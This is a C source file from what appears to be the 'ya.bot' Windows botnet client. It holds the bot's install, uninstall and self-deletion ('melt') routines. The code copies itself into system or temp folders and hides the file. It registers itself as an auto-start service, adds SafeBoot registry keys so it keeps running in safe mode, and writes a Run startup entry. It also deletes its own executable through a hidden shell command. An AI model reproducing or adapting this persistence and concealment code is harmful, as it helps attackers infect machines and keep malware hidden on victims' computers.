/*  ya.bot  */

#include "..\bot.h"

#ifndef NO_INSTALLBOT
bool install_bot()
{
	char szFilePath[MAX_PATH], szInstallPath[MAX_PATH], szSystemDirectory[MAX_PATH];

#ifndef NO_DEBUG
		debug_print("Installing bot, install_bot()");
#endif

		GetModuleFileName(NULL, szFilePath, sizeof(szFilePath) - 1);
	if (botinstallasservice)
	{
			GetSystemDirectory(szSystemDirectory, sizeof(szSystemDirectory) - 1);
			_snprintf(szInstallPath, sizeof(szInstallPath) - 1,
					string_filepath,
					szSystemDirectory,
					botfilename);
	}
	else
	{
			GetTempPath(sizeof(szInstallPath) - 1, szInstallPath);
			strncat(szInstallPath,
					(char *)botfilename,
					(sizeof(szInstallPath) - strlen(szInstallPath)) - 1);
	}
	if (strstr(szFilePath, (char *)botfilename))
	{
			SetFileAttributes(szFilePath,
					FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
		if (botinstallasservice)
		{
			if (service_install((char *)botstartupname,
						szFilePath,
						SERVICE_WIN32_OWN_PROCESS,
						SERVICE_AUTO_START,
						TRUE))
			{
					registry_createkey(HKEY_LOCAL_MACHINE,
							(char *)string_installregistrysafebootminimal,
							(char *)botstartupname);
					registry_createkey(HKEY_LOCAL_MACHINE,
							(char *)string_installregistrysafebootnetwork,
							(char *)botstartupname);
					return TRUE;
			}
		}
			registry_writestring(HKEY_LOCAL_MACHINE,
					(char *)string_installregistrystartup,
					(char *)botstartupname,
					(char *)szFilePath);
			return FALSE;
	}
	if (!CopyFile(szFilePath, szInstallPath, TRUE))
	{
			SetFileAttributes(szFilePath,
					FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
		if (botinstallasservice)
		{
			if (service_install((char *)botstartupname,
						szFilePath,
						SERVICE_WIN32_OWN_PROCESS,
						SERVICE_AUTO_START,
						TRUE))
			{
					registry_createkey(HKEY_LOCAL_MACHINE,
							(char *)string_installregistrysafebootminimal,
							(char *)botstartupname);
					registry_createkey(HKEY_LOCAL_MACHINE,
							(char *)string_installregistrysafebootnetwork,
							(char *)botstartupname);
					return TRUE;
			}
		}
			registry_writestring(HKEY_LOCAL_MACHINE,
					(char *)string_installregistrystartup,
					(char *)botstartupname,
					(char *)szFilePath);
			return FALSE;
	}
		SetFileAttributes(szInstallPath,
				FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
	if (botinstallasservice)
	{
		if (service_install((char *)botstartupname,
					szInstallPath,
					SERVICE_WIN32_OWN_PROCESS,
					SERVICE_AUTO_START,
					TRUE))
		{
				registry_createkey(HKEY_LOCAL_MACHINE,
						(char *)string_installregistrysafebootminimal,
						(char *)botstartupname);
				registry_createkey(HKEY_LOCAL_MACHINE,
						(char *)string_installregistrysafebootnetwork,
						(char *)botstartupname);
				return TRUE;
		}
	}
		registry_writestring(HKEY_LOCAL_MACHINE,
				(char *)string_installregistrystartup,
				(char *)botstartupname,
				(char *)szInstallPath);
	if (!process_start(szInstallPath, FALSE))
			return FALSE;
		return TRUE;
}

bool uninstall_bot()
{
	char szFilePath[MAX_PATH];

#ifndef NO_DEBUG
			debug_print("Uninstalling bot, uninstall_bot()");
#endif

		GetModuleFileName(NULL, szFilePath, sizeof(szFilePath) - 1);
		SetFileAttributes(szFilePath, FILE_ATTRIBUTE_NORMAL);
	if (botinstallasservice)
	{
		if (service_uninstall((char *)botstartupname))
		{
				registry_deletekey(HKEY_LOCAL_MACHINE,
						(char *)string_installregistrysafebootminimal,
						(char *)driverservicename);
				registry_deletekey(HKEY_LOCAL_MACHINE,
						(char *)string_installregistrysafebootnetwork,
						(char *)driverservicename);
				return TRUE;
		}
	}
		registry_deletevalue(HKEY_LOCAL_MACHINE,
				(char *)string_installregistrystartup,
				(char *)botstartupname);
		registry_deletevalue(HKEY_CURRENT_USER,
				(char *)string_installregistrystartup,
				(char *)botstartupname);
		return TRUE;
}

//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original code from catch22
//http://catch22.net/tuts/selfdel.asp
//botbotbotbotbotbotbotbotbotbotbotbotbot

bool uninstall_botmelt()
{
	char szCommand[MAX_PATH], szFilePath[MAX_PATH];

#ifndef NO_DEBUG
		debug_print("Melting bot, uninstall_botmelt()");
#endif

	if ((GetModuleFileName(0,
			szFilePath,
			sizeof(szFilePath) - 1) !=0) &&
		(GetShortPathName(szFilePath,
				szFilePath,
				sizeof(szFilePath)) !=0))
	{
			_snprintf(szCommand, sizeof(szCommand) - 1, string_installmeltcommand, szFilePath);
		if ((GetEnvironmentVariable(string_installmeltcomspec,
				szFilePath,
				sizeof(szFilePath) - 1) !=0 ) &&
			((int)ShellExecute(NULL,
					string_fileopen,
					szFilePath,
					szCommand,
					NULL,
					SW_HIDE) > 32)) return TRUE;
	}
		return FALSE;
}
#endif